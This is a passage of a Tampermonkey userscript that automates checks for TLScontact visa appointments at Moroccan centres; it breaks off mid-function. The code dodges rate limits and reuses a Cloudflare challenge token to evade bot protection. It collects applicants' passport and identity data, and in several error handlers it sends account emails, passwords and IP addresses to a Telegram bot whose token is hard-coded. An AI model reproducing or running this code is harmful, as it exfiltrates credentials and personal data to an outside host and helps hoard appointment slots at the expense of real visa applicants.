// ==UserScript==
// @name         JYCOSCRIPT RENAISSANCE V3
// @namespace    http://tampermonkey.net/
// @version      2025-05-23  08:53
// @description  try to take over the world!
// @author       You
// @match        http://*/*
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @grant        Allah est le Créateur de toute chose, et de toute chose Il est Garant. Il détient les clefs des cieux et de la terre; et ceux qui ne croient pas aux versets d'Allah, ce sont ceux-là les perdants.
// ==/UserScript==
var version = "V1.2 2025-05-23   08:53";

var CLP;
var MAXO;
var MINO;

// Liste des heures critiques où la page doit être rechargée
const criticalHours = [8, 10, 13, 18, 23];

// Vérification toutes les 30 secondes
setInterval(checkAndReload, 43 * 1000);

function checkAndReload() {
    let now = new Date();

    // Récupérer l'heure exacte en France (Europe/Paris)
    let options = { timeZone: "Europe/Paris", hour12: false, hour: "2-digit", minute: "2-digit" };
    let formattedTime = new Intl.DateTimeFormat("fr-FR", options).format(now);
    let [currentHour, currentMinute] = formattedTime.split(":").map(Number);

    // Vérifier si on est à 01 minute après une heure critique
    if (criticalHours.includes(currentHour) && currentMinute === 1) {
        if (localStorage.getItem("lastReloadHour") != currentHour) {
            console.log(`Reloading page at ${currentHour}:${currentMinute} (Europe/Paris)`);
            localStorage.setItem("lastReloadHour", currentHour); // Marquer cette heure comme déjà rechargée
            location.reload(); // Recharger la page
        }
    }

    // Réinitialiser la mémoire si on a dépassé l'heure critique
    if (!criticalHours.includes(currentHour)) {
        localStorage.removeItem("lastReloadHour");
    }
}

// Fonction pour récupérer l'heure actuelle en France (Europe/Paris)
function getCurrentHour() {
    let now = new Date();
    let options = { timeZone: "Europe/Paris", hour12: false, hour: "2-digit" };
    let formattedHour = new Intl.DateTimeFormat("fr-FR", options).format(now);

    // Supprimer tous les caractères non numériques (ex: espace, "h", etc.)
    let hourNumber = Number(formattedHour.replace(/\D/g, ""));

    if (isNaN(hourNumber)) {
        console.error("Erreur lors de la conversion de l'heure:", formattedHour);
        return 0; // Valeur par défaut en cas d'erreur
    }

    return hourNumber;
}

// Définition des valeurs MINO et MAXO en fonction de l'heure (Europe/Paris)
let currentHour = getCurrentHour();

// Assurer que currentHour est un nombre valide
if (!isNaN(currentHour)) {
    if (currentHour >= 9 && currentHour < 11) {
        MINO = 40e3; MAXO = 60e3;
    } else if (currentHour >= 11 && currentHour < 15) {
        MINO = 40e3; MAXO = 60e3;
    } else if (currentHour >= 15 && currentHour < 19) {
        MINO = 40e3; MAXO = 60e3;
    } else if (currentHour >= 19 && currentHour < 23) {
        MINO = 60e3; MAXO = 90e3;
    } else if (currentHour >= 23 || currentHour < 9) { // Pour inclure la nuit (0h-7h)
        MINO = 40e3; MAXO =320e3;
    }
} else {
    console.error("Erreur: currentHour n'est pas un nombre valide.");
    MINO = 130e3; // Valeurs par défaut pour éviter un NaN
    MAXO = 320e3;
}

// Afficher les valeurs actuelles
console.log(`Current Hour (Europe/Paris): ${currentHour}h`);
console.log(`MINO: ${MINO / 1000} sec, MAXO: ${MAXO / 1000} sec`);

// Déterminer les valeurs spécifiques à chaque page
let pathSegment = window.location.pathname.split("/")[3];

switch (pathSegment) {
    case 'maOUD2fr':
        var cas1 = 25; var cas2 = 10; var cas3 = 15; var cas4 = 1;
        break;
    case 'maCAS2fr':
        cas1 = 4; cas2 = 4; cas3 = 4; cas4 = 1;
        break;
    case 'maTNG2fr':
        cas1 = 15; cas2 = 15; cas3 = 15; cas4 = 1;
        break;
    case 'maRBA2fr':
        cas1 = 15; cas2 = 15; cas3 = 15; cas4 = 1;
        break;
}



if((document.body.innerText).indexOf('This XML file does not appear to have any style information associated with it. The document tree is shown below.') > -1){ setTimeout(function(){ location.reload(); document.body.style.backgroundColor = "#FFA500"; }, 60e3); };
if((document.body.innerText).indexOf('You have tried to log in too many times. For security reasons, you are blocked. Please re-connect later.') > -1){       setTimeout(function(){ window.location = "https://ps.w.org/limit-login-attempts-reloaded/assets/banner-1544x500.png?rev=2954981"; }, 60e3);   }
if((document.body.innerText).indexOf('UNAUTHORIZED') > -1){ setTimeout(function(){ location.reload(); document.body.style.backgroundColor = "#FFA500"; }, 7000); };
if((document.body.innerText).indexOf('jhipster') > -1){ setTimeout(function(){ /*window.location.href = 'https://fr.tlscontact.com/visa/'+firstTwoLetters+'/'+inputString+'/home';*/ location.reload(); document.body.style.backgroundColor = "#FFA500"; }, 7000); };
if((document.body.innerText).indexOf('Internal Server Error') > -1){ setTimeout(function(){ location.reload(); document.body.style.backgroundColor = "#FFA500"; }, 7000); };
if((document.body.innerText).indexOf('You are already logged in.') > -1){ setTimeout(function(){ window.location.href = 'https://fr.tlscontact.com'; document.body.style.backgroundColor = "#FFA500"; }, 7000); };
if((document.body.innerText).indexOf('Vous êtes déjà connecté.') > -1){ setTimeout(function(){ window.location.href = 'https://fr.tlscontact.com'; document.body.style.backgroundColor = "#FFA500"; }, 7000); };
if((document.body.innerText).indexOf('403 ERROR') > -1){ setTimeout(function(){ location.reload(); document.body.style.backgroundColor = "#FFA500"; }, 7000); };
if((document.body.innerText).indexOf('Error 403') > -1){ setTimeout(function(){ document.body.style.backgroundColor = "#FFA500"; }, 7000); };

setTimeout(function(){ window.location.reload() }, 900e3);


var message = ""
function ERROR() {
     const call = message
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001932938808', text: call, parse_mode: 'html'}));
}


if((document.body.innerText).indexOf('The service is temporarily unavailable. TLScontact team.') > -1){  setTimeout(function(){ location.reload(); }, 3000);
message = "The service is temporarily unavailable. TLScontact team.";
ERROR();
}

var pays = window.location.pathname.split("/")[2];
var juridiction;
if (pays == "ma") {juridiction = window.location.pathname.split("/")[3]/*"maCAS2fr";*/ } else if (pays == "dz") { juridiction = window.location.pathname.split("/")[3]; }

setTimeout(function(){
const inputString = localStorage.getItem("TLS_WEB_issuer");
const currentURL = window.location.href;
const firstTwoLetters = inputString.substring(0, 2);
if (window.location.pathname === '/' || window.location.pathname === '/not-found' ) {
setTimeout(function(){ window.location.href = 'https://fr.tlscontact.com/visa/'+firstTwoLetters+'/'+inputString+'/home'; document.body.style.backgroundColor = "#FFA500"; }, 1000);
}
},2e3);

var refer = localStorage.getItem("refi"+localStorage.getItem("TLS_WEB_issuer"));
var timer = 300e3;

if ( window.location.pathname.split("/")[1] !== 'personal' && window.location.pathname.split("/")[1] !== 'checkout' && window.location.pathname.split("/")[1] !== 'binga' ) {  setTimeout(function(){ window.location.reload() }, 3000e3);
if((document.body.innerText).indexOf('501') > -1){ setTimeout(function(){ location.reload(); document.body.style.backgroundColor = "#FFA500"; }, 3000); };
if((document.body.innerText).indexOf('502') > -1){ setTimeout(function(){ location.reload(); document.body.style.backgroundColor = "#FFA500"; }, 3000); };
if((document.body.innerText).indexOf('503') > -1){ setTimeout(function(){ location.reload(); document.body.style.backgroundColor = "#FFA500"; }, 3000); };
if((document.body.innerText).indexOf('504') > -1){ setTimeout(function(){ location.reload(); document.body.style.backgroundColor = "#FFA500"; }, 3000); };
if((document.body.innerText).indexOf('522') > -1){ setTimeout(function(){ location.reload(); document.body.style.backgroundColor = "#FFA500"; }, 33000); };
if((document.body.innerText).indexOf('524') > -1){ setTimeout(function(){ location.reload(); document.body.style.backgroundColor = "#FFA500"; }, 33000); };}
if((document.body.innerText).indexOf('404 - Not Found') > -1){ setTimeout(function(){ location.reload(); document.body.style.backgroundColor = "#FFA500"; }, 10000); };
if ( (document.body.innerText).indexOf('over-freshening') > -1 ) {
setTimeout(function(){ window.location = "https://ps.w.org/limit-login-attempts-reloaded/assets/banner-1544x500.png?rev=2954981"; }, 5e3);
message = "TLSContact over-freshening" + "\n" +     localStorage.getItem("IP"); ERROR(); }
else if (
    (document.body.innerText).indexOf('You have been temporarily blocked') > -1 &&  window.location.href.includes('403') === false) {
    setTimeout(function(){ window.location = "https://ps.w.org/limit-login-attempts-reloaded/assets/banner-1544x500.png?rev=2954981"; }, 6e3);
message = "You have been temporarily blocked" + "\n" +     localStorage.getItem("IP"); ERROR();}

else {
if (document.title !== 'tlscontact.com' && document.title !== 'Un instant…' && document.title !== 'Just a moment...') {

var dateGMT = new Date();
var hourGMT = dateGMT.getUTCHours();

document.body.insertAdjacentHTML("beforeend", "<div id='MOTIF' style='position:fixed;z-index:20000;top:0;left:100;background-color:#000;color:#FFF;padding:10px;font-size:16px;font-family: Arial, Helvetica, sans-serif;text-align:center;'></div>");
document.body.insertAdjacentHTML("beforeend", "<div id='EMAIL' style='position:fixed;z-index:20000;top:0;right:0;background-color:#000;color:#FFF;padding:10px;font-size:16px;font-family: Arial, Helvetica, sans-serif;text-align:center;'></div>");

////////// ESPACES GetDate /////////////                     ////////// ESPACES GetDate /////////////                ////////// ESPACES GetDate /////////////
////////// ESPACES GetDate /////////////                     ////////// ESPACES GetDate /////////////                ////////// ESPACES GetDate /////////////

////////// ESPACES GetDate /////////////                     ////////// ESPACES GetDate /////////////                ////////// ESPACES GetDate /////////////
////////// ESPACES GetDate /////////////                     ////////// ESPACES GetDate /////////////                ////////// ESPACES GetDate /////////////

////////// ESPACES GetDate /////////////                     ////////// ESPACES GetDate /////////////                ////////// ESPACES GetDate /////////////
////////// ESPACES GetDate /////////////                     ////////// ESPACES GetDate /////////////                ////////// ESPACES GetDate /////////////

// Store the time when the page is loaded
let pageStartTime = performance.now();

// Function to track the time the page has been active
function getPageActiveTime() {
    return ((performance.now() - pageStartTime) / 1000).toFixed(3); // Convert to seconds
}

function GetDate() {
const urlToCheck = 'https://fr.tlscontact.com/appointment/' + window.location.pathname.split("/")[2] + '/' + window.location.pathname.split("/")[3] + '/' + window.location.pathname.split("/")[4];

function checkStatus(url) {
    fetch(url)
        .then(response => {
            if (response.status === 429) {
                if (localStorage.getItem("FORMS429") == 3) { }
                else {
                setTimeout(function(){ checkStatus(urlToCheck) }, 210e3);
                console.log(`Too Many Requests: ${response.status} at ${new Date().toLocaleTimeString()}`);
var url429 = 'https://fr.tlscontact.com/personal/' + window.location.pathname.split("/")[2] + '/' + window.location.pathname.split("/")[3] + '/' + window.location.pathname.split("/")[4] + '?jyco';
setTimeout(function(){ window.location.href =  window.location  }, 20e3);
                }
            } else if (response.status === 403) {
                if (localStorage.getItem("FORMS429") == 3) { document.title = "403 DETECTED" }
                else {
                setTimeout(function(){ checkStatus(urlToCheck) }, 80e3);
                console.log(`Forbidden: ${response.status} at ${new Date().toLocaleTimeString()}`);
setTimeout(function(){ window.location.href =  window.location  }, 20e3);
                }
            } else if (response.status === 401) {  setTimeout(function(){ location.reload(); }, 22e3);
                console.log(`Unauthorized: ${response.status} at ${new Date().toLocaleTimeString()}`);
            } else {
                document.getElementById("MOTIF").textContent = "votre checkStatus : " + `Status: ${response.status} at ${new Date().toLocaleTimeString()}`;
                console.log(`Status: ${response.status} at ${new Date().toLocaleTimeString()}`);
                setTimeout(function(){ checkStatus(urlToCheck)  }, 540e3);
            }
        })
        .catch(error => {
            console.error(`Error fetching URL: ${error}`);
        setTimeout(function(){ window.location.href =  window.location  }, 210e3);
        });
}


//var scriptS20 = document.createElement('script'); scriptS20.src = "https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"; document.head.appendChild(scriptS20);
//var scriptS30 = document.createElement('script'); scriptS30.src = "https://smtpjs.com/v3/smtp.js"; document.head.appendChild(scriptS30);

    fetch("https://fr.tlscontact.com/services/customerservice/api/tls/forms/list/fr/"+window.location.pathname.split("/")[3]+"?fg_id="+window.location.pathname.split("/")[4]+'&jyco=1')
    .then(response => {
        if (response.status === 404) {  console.error("statut : " + response.status); document.getElementById("MOTIF").textContent = "votre forms statut : " + response.status; setTimeout(function(){ GetDate(); },100e3);
message = "forms statut 404 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("TLS_WEB_issuer") + "\n" +     localStorage.getItem("IP"); ERROR();
        setTimeout(function () {
            window.location = "https://as2.ftcdn.net/v2/jpg/00/65/14/03/1000_F_65140353_MtK6aWCZzo7w0gauEIk6bZcXKso0drlq.jpg";
        }, 5000);
                                     }
                    else
        if (response.status === 429) {

localStorage.setItem("FORMS429", parseInt(localStorage.getItem("FORMS429")) + parseInt(1));

  const FORMS429 = localStorage.getItem("FORMS429");
    const disconnectFORMS429429 = 3;
    if (localStorage.getItem("FORMS429") === null || parseInt(localStorage.getItem("FORMS429")) < disconnectFORMS429429) {
        localStorage.setItem("FORMS429", 1);
        document.getElementById("MOTIF").textContent = "votre forms statut : " + response.status;
        console.error("statut : " + response.status);

    } else if (parseInt(localStorage.getItem("FORMS429")) > disconnectFORMS429429) {
                localStorage.setItem("FORMS429", 0);
        document.getElementById("MOTIF").textContent = "votre forms statut : " + response.status + " RELOAD ";
        console.error("statut : " + response.status);
        message = "forms statut 429 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("TLS_WEB_issuer") + "\n" +     localStorage.getItem("IP");
ERROR();
        setTimeout(function () {
            window.location = "https://intfiction.org/uploads/default/optimized/2X/e/e04f0a22ef639e39ff3bffd9c319e02146c95406_2_1035x541.png";
        }, 5000);
    }

                                     }
            else
        if (response.status === 403) {  console.error("statut : " + response.status); document.getElementById("MOTIF").textContent = "votre forms statut : " + response.status;
if ( window.location.pathname.split("/")[1] == 'inquiry' ) {  window.location.href = "https://fr.tlscontact.com/personal/"+ window.location.pathname.split("/")[2] + "/" + window.location.pathname.split("/")[3] + "/" + localStorage.getItem("TLS_WEB_formGroupId");  }
else { setTimeout(function(){ document.title = "403 DETECTED" },70e3); }
                                     }
            else
        if (response.status === 401) {  console.error("statut : " + response.status); document.getElementById("MOTIF").textContent = "votre forms statut : " + response.status;

           setTimeout(function(){
setTimeout(function () { window.location.href = window.location.href;  }, 10e3);
                                                           },10e3); }
            else
        if (response.status === 504 || response.status === 502 || response.status === 503) {  document.getElementById("MOTIF").textContent = "votre forms statut : " + response.status; console.error("statut : " + response.status); setTimeout(function(){ GetDate(); },10e3);
        }
                    else
if (response.status === 500) {

setTimeout(function () { window.location.href = window.location.href;  }, 80e3);
}

        return response.json();
    })
    .then(data => {
        const fIdCount = data.length;
        console.log(fIdCount); // Output: 3
        const values = data[0];
        const fVisaType = values.f_visa_type;
        const fTravPurpose = values.f_trav_purpose;
        const fiAppointmentType = values.fi_appointment_type;
        const fi_csl_appointment_type = values.fi_csl_appointment_type;
        const f_xcopy_ug_type = values.f_xcopy_ug_type;
        ///////////////////////////////////////////////////////////////////////////////////////////
    const fields = {
        f_visa_type: values.f_visa_type,
        f_trav_purpose: values.f_trav_purpose,
        fi_appointment_type: values.fi_appointment_type,
        f_xcopy_ug_type: values.f_xcopy_ug_type,
        f_xref_fg_id: values.f_xref_fg_id,
        f_tech_creation: values.f_tech_creation,
        f_cai: values.f_cai,
        f_identity_type: values.f_identity_type,
        f_order: values.f_order,
        f_pass_num: values.f_pass_num,
        f_pers_birth_date: values.f_pers_birth_date,
        f_pers_givennames: values.f_pers_givennames,
        f_pers_mobile_phone: values.f_pers_mobile_phone,
        f_pers_nationality: values.f_pers_nationality,
        f_pers_surnames: values.f_pers_surnames,
        f_trav_purpose: values.f_trav_purpose,
        f_xcopy_ug_xref_i_tag: values.f_xcopy_ug_xref_i_tag,
        f_xref_f_id: values.f_xref_f_id,
        fi_csl_appointment_type: values.fi_csl_appointment_type,
        fi_fingerprints_collected: values.fi_fingerprints_collected,
        fi_first_schengen_trip: values.fi_first_schengen_trip,
        fi_trav_origin_departure_date: values.fi_trav_origin_departure_date
    };

            const dataFields = Object.entries(fields).map(([key, value]) => `${key}: ${value}`).join(" | ");
        if ( values.f_visa_type != "visa_type_unselected" && values.f_pers_birth_date !== undefined ) {
    console.log("DATA01:", dataFields);
    localStorage.setItem("DATA"+localStorage.getItem("TLS_WEB_issuer"), dataFields + "|" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) +  "|" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) );
        }
                ///////////////////////////////////////////////////////////////////////////////////////////

        localStorage.setItem("membre"+localStorage.getItem("TLS_WEB_issuer"), fIdCount);
        localStorage.setItem("fiAppointmentType"+localStorage.getItem("TLS_WEB_issuer"), fiAppointmentType);
        localStorage.setItem("fi_csl_appointment_type"+localStorage.getItem("TLS_WEB_issuer"), fi_csl_appointment_type);
        localStorage.setItem("f_xcopy_ug_type"+localStorage.getItem("TLS_WEB_issuer"), f_xcopy_ug_type);
        localStorage.setItem("f_trav_purpose"+localStorage.getItem("TLS_WEB_issuer"), fTravPurpose );
        const ref = window.location.pathname.split("/")[4];
        const center = window.location.pathname.split("/")[3];
        const country = window.location.pathname.split("/")[2];
        localStorage.setItem("FORMS429", 0);
        var tt = "1"
        function Gettable() {

            localStorage.setItem("done", "0" );

              const disponible = document.querySelectorAll('button#save.tls-button-link');
  if (disponible.length > 0) {  console.log("button already exists");  }
                        else {
    console.log("dispo button creation");
    const now = new Date();
const hours = now.getUTCHours();
const minutes = now.getUTCMinutes();
const seconds = now.getUTCSeconds();

var Type = localStorage.getItem("fiAppointmentType"+localStorage.getItem("TLS_WEB_issuer"));
var Type2 = localStorage.getItem("fi_csl_appointment_type"+localStorage.getItem("TLS_WEB_issuer"));

const cookieNameTable = "XSRF-TOKEN";
const cookieValueTable = document.cookie.split('; ').find(row => row.startsWith(cookieNameTable)).split('=')[1];
  const formDataTable = {};
// INDI
     //   const url = `https://fr.tlscontact.com/services/customerservice/api/tls/appointment/ma/${center}/table?client=fr&formGroupId=${ref}&appointmentType=${Type2}&appointmentStage=appointment`;
             const url = `https://fr.tlscontact.com/services/customerservice/api/tls/appointment/ma/${center}/table?client=fr&formGroupId=${ref}&appointmentType=${Type2}&appointmentStage=appointment`;
                       
        fetch(url , {
  headers: {
    "x-xsrf-token": cookieValueTable,
  }
})
.then(async response => {
    const textResponse = await response.text();
            
    if (response.status === 429) {
        if (textResponse.includes("<title>Just a moment...</title>")) { 
console.log("Cloudflare protection detected.");            
document.getElementById("MOTIF").textContent = "Table statut : " + response.status + " Just a moment...";    

 if ( localStorage.getItem("cloudflare") == "0" ) { setTimeout(function(){    window.open('https://fr.tlscontact.com/services/customerservice/api/tls/appointment/ma/maCAS2fr/table?cloudflare', '_blank');   }, 5e3); localStorage.setItem("cloudflare", 1); }
 setTimeout(function(){    Gettable();   }, 65e3);  
            
    let url = window.location.href;
let newUrl1 = url.replace("appointment", "appointment");            
let newUrl2 = url.replace("personal", "appointment");            
if (window.location.pathname.split("/")[1] === 'personal') {
setTimeout(function(){    window.location.href = newUrl2 + "?__cf_chl_rt_tk=WQ41.uvPHkoLBVJle0EB2QYCC04DGMmcloWb80W7FGM-1739911038-1.0.1.1-iJDr.hYp55vEjRkRq64C1h0fy0ypqKYHJtbu2o0JXqo"   }, 15e3);
}
else if (window.location.pathname.split("/")[1] === 'appointment') {
//setTimeout(function(){    window.location.href = newUrl1 + "?__cf_chl_rt_tk=WQ41.uvPHkoLBVJle0EB2QYCC04DGMmcloWb80W7FGM-1739911038-1.0.1.1-iJDr.hYp55vEjRkRq64C1h0fy0ypqKYHJtbu2o0JXqo"   }, 15e3);
setTimeout(function(){    location.reload()  }, 15e3);        
}         
            
    }
else if (textResponse.includes("<!doctype html>") && textResponse.includes("<title>TLSContact Error</title>")) {
console.log("TLSContact Error detected.");    
document.getElementById("MOTIF").textContent = "Table statut : " + response.status + " TLSContact Error";                        
message = "statut 429 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("TLS_WEB_issuer") + "\n" +     localStorage.getItem("IP");
ERROR();            
        setTimeout(function () {
   location.reload();   //  window.location.href = "https://blsspainmorocco.com/"   // window.location = "https://intfiction.org/uploads/default/optimized/2X/e/e04f0a22ef639e39ff3bffd9c319e02146c95406_2_1035x541.png";
        }, 150000);
} }

else if (response.status === 404) { 
    
                    localStorage.setItem("input429", 0); localStorage.setItem("FORMS429", 0); localStorage.removeItem('pageReloaded'); localStorage.setItem("403ERROR", 0);
                document.getElementById("MOTIF").textContent = "Status 404 : Aucune date disponible . " + "\n" + "Derniere Actualisation" + " " + hours + " : " + minutes + " : " + seconds;
                console.log("Status : Aucune date disponible . " + "\n" + "Derniere Actualisation" + " " + hours + " : " + minutes + " : " + seconds);

                function getRandomDelay(min, max) {
    return Math.random() * (max - min) + min;
}
            let delay = getRandomDelay(MINO, MAXO);  
            console.log(`Attente de ${(delay / 1000).toFixed(2)} secondes avant la prochaine requête...`);
            setTimeout(Gettable, delay);
                                  }

            ////////// ESPACE 403 /////////////                     ////////// ESPACE 403 /////////////                ////////// ESPACE 403 /////////////
            ////////// ESPACE 403 /////////////                     ////////// ESPACE 403 /////////////                ////////// ESPACE 403 /////////////

else    if (response.status === 403) {
        if (textResponse.includes("<title>Just a moment...</title>")) { 
 document.getElementById("MOTIF").textContent = "Table statut : " + response.status + " Just a moment...";
//setTimeout(function(){    window.location.href = window.location.href  +"?__cf_chl_rt_tk=WQ41.uvPHkoLBVJle0EB2QYCC04DGMmcloWb80W7FGM-1739911038-1.0.1.1-iJDr.hYp55vEjRkRq64C1h0fy0ypqKYHJtbu2o0JXqo"   }, 15e3);

 if ( localStorage.getItem("cloudflare") == "0" ) { setTimeout(function(){    window.open('https://fr.tlscontact.com/services/customerservice/api/tls/appointment/ma/maCAS2fr/table?cloudflare', '_blank');   }, 5e3); localStorage.setItem("cloudflare", 1); }
 setTimeout(function(){    Gettable();   }, 65e3);            
            
    let url = window.location.href;
let newUrl1 = url.replace("appointment", "personal");
let newUrl2 = url.replace("personal", "appointment");            
if (window.location.pathname.split("/")[1] === 'personal') {
setTimeout(function(){    window.location.href = newUrl2 + "?__cf_chl_rt_tk=WQ41.uvPHkoLBVJle0EB2QYCC04DGMmcloWb80W7FGM-1739911038-1.0.1.1-iJDr.hYp55vEjRkRq64C1h0fy0ypqKYHJtbu2o0JXqo"   }, 15e3);
}
else if (window.location.pathname.split("/")[1] === 'appointment') {
//setTimeout(function(){    window.location.href = newUrl1 + "?__cf_chl_rt_tk=WQ41.uvPHkoLBVJle0EB2QYCC04DGMmcloWb80W7FGM-1739911038-1.0.1.1-iJDr.hYp55vEjRkRq64C1h0fy0ypqKYHJtbu2o0JXqo"   }, 15e3);
setTimeout(function(){    location.reload()  }, 15e3);
         
}    
        }
else if (textResponse.includes("<!doctype html>") && textResponse.includes("<title>TLSContact Error</title>")) {
 document.getElementById("MOTIF").textContent = "Table statut : " + response.status + " TLSContact Error";            
message = "statut 403 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("TLS_WEB_issuer") + "\n" +     localStorage.getItem("IP");
ERROR();            
        setTimeout(function () {
   location.reload();   //  window.location.href = "https://blsspainmorocco.com/"   // window.location = "https://intfiction.org/uploads/default/optimized/2X/e/e04f0a22ef639e39ff3bffd9c319e02146c95406_2_1035x541.png";
        }, 150000);
} }            
            /*
else if (response.status === 403 && textResponse.includes("<title>Just a moment...</title>") ) { localStorage.setItem("inputi403", 1);

    function ERROR403() {
(async function handleUrlRequest() {
    const URL_1 = "https://fr.tlscontact.com/oauth2/authorization/oidc";
    try {
        const response = await fetch(URL_1, {
            method: "GET",
            headers: {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*
                /*;q=0.8",
                /// ACCEPT MODIFY DELTE SPACE
                "User-Agent": navigator.userAgent,
            },
        });
        console.log(`Response status: ${response.status}`);
        if (response.status === 200) {
            setTimeout(function(){ Gettable(); },50e3);
            message = "oidc statut 200"; ERROR();
            console.log("Status 200: Request successful. No further actions required.");
        } else if (response.status === 403 || response.status === 429) {
                        message = "oidc statut 403 429"; ERROR();
            console.warn(`Status ${response.status}: Opening the URL in the current window.`);
          setTimeout(function () {  window.location.href = URL_1; },2e3);
        } else {
            console.error(`Unhandled response status: ${response.status}`);
        }
    } catch (error) {
        console.error("An error occurred during the request:", error);
    }
})();
    }

const inputi403 = localStorage.getItem("inputi403");
const disconnect403 = 3;
    if (localStorage.getItem("inputi403") === null || parseInt(localStorage.getItem("inputi403")) < disconnect403) {
        localStorage.setItem("inputi403", parseInt(localStorage.getItem("inputi403")) + parseInt(1));
        document.getElementById("MOTIF").textContent = "votre table statut : " + response.status;
        console.error("statut : " + response.status);
        setTimeout(function(){ document.title = "403 DETECTED" },90e3);
        //setTimeout(function(){ ERROR403(); },50e3);
        tt = Math.floor(Math.random() * 10);

    } else if (parseInt(localStorage.getItem("inputi403")) > disconnect403) {
                localStorage.setItem("inputi403", 0);
        document.getElementById("MOTIF").textContent = "votre table statut : " + response.status + " blocked ";
        console.error("statut : " + response.status);
        message = "statut 403 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("TLS_WEB_issuer") + "\n" +     localStorage.getItem("IP");
        ERROR();
        setTimeout(function(){ ERROR403(); },15e3);
        setTimeout(function () {
           // window.location = "https://intfiction.org/uploads/default/optimized/2X/e/e04f0a22ef639e39ff3bffd9c319e02146c95406_2_1035x541.png";
        }, 5000);
    }
                                     }
*/
            
            ////////// ESPACE 403 /////////////                     ////////// ESPACE 403 /////////////                ////////// ESPACE 403 /////////////
            ////////// ESPACE 403 /////////////                     ////////// ESPACE 403 /////////////                ////////// ESPACE 403 /////////////

            else
        if (response.status === 401) {  console.error("statut : " + response.status); document.getElementById("MOTIF").textContent = "votre table statut : reload " + response.status;

setTimeout(function () { window.location.href = window.location.href; }, 1e3);

           message = "statut 401 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"));
                                      ERROR();
   }

            else

   if (response.status === 500) {

message = "table statut 500 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("TLS_WEB_issuer") + "\n" +     localStorage.getItem("IP"); ERROR();
        //setTimeout(function () { window.location = "https://digitiz.fr/wp-content/uploads/2022/07/Erreur-500.png"; }, 5000);
       
        setTimeout(function () { window.location = window.location }, 75000);

   }
            else
        if (response.status === 503) {   console.error("votre table statut : " + response.status); document.getElementById("MOTIF").textContent = "table statut : " + response.status; setTimeout(function(){ Gettable(); },1e3); }
            else
        if (response.status === 502) {   console.error("votre table statut : " + response.status); document.getElementById("MOTIF").textContent = "table statut : " + response.status; setTimeout(function(){ Gettable(); },1e3); }
                    else
        if (response.status === 504) {   console.error("votre table statut : " + response.status); document.getElementById("MOTIF").textContent = "table statut : " + response.status; setTimeout(function(){ Gettable(); },1e3); }

 // ✅ Convert response back to JSON (only if it was not an error)
    try {
        return JSON.parse(textResponse); // Convert manually since .text() was used
    } catch (error) {
        console.error("❌ JSON Parse Error:", error);
        return null; // Stop further processing
    }
})
.then(data => {
    if (!data) {
        console.warn("⚠️ No valid JSON response received.");
        return;
    }
            const availableDatesAndHours = {};
            for (const date in data) {
                const hours = data[date];
                const hoursWithValueGreaterThanZero = [];
                for (const hour in hours) {
                    if (hours[hour] > 0 ) {
                        hoursWithValueGreaterThanZero.push(hour);
 }
                }
                if (hoursWithValueGreaterThanZero.length > 0) {
                    availableDatesAndHours[date] = hoursWithValueGreaterThanZero;
                }}

            const totalCount = Object.values(availableDatesAndHours).flat().length ;

            //if (totalCount > CLPI ) {
            if (Object.keys(availableDatesAndHours).length > 0) {
        var dateText = `${Object.keys(availableDatesAndHours).join('\n')}`;
    const dateText2 = Object.entries(availableDatesAndHours).map(([date, hours]) => hours.map(hour => `${date} ${hour}`).join('\n')).join('\n');
                if ( dateText.includes("2025")) {

                   // Gettable()
                const hoursCount = Object.values(availableDatesAndHours).flat().length;
                document.getElementById("MOTIF").textContent = "Available Dates and Hours"  ;

const f_xcopy_ug_type1 = localStorage.getItem("f_xcopy_ug_type"+localStorage.getItem("TLS_WEB_issuer"));

  const call = "TLSContact GO ** TLSContact ON \n" + "\n- Center : " + center  + "\n- Motif : " + fTravPurpose  +  `\n- Nombre d'heure : ${hoursCount}` + "\n- TIMER : " +  hours + " : " + minutes + " : " + seconds + "\n" + "member : " + localStorage.getItem("membre"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + "\n- Dates :  \n" + "  \n" + dateText2 + "\n  ";
  const xhr = new XMLHttpRequest();
  xhr.open('POST', `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001899193944', text: call, parse_mode: 'html'}));


const fiAppointmentType2 = localStorage.getItem("fiAppointmentType"+localStorage.getItem("TLS_WEB_issuer"));
var typo2 = "";
var s ;

                    if (fiAppointmentType2 && typeof fiAppointmentType2 === "string") {
    var membre =  localStorage.getItem("membre"+localStorage.getItem("TLS_WEB_issuer"));
if ( membre  > 0 ) { var t = "F" } else { t = "I" }
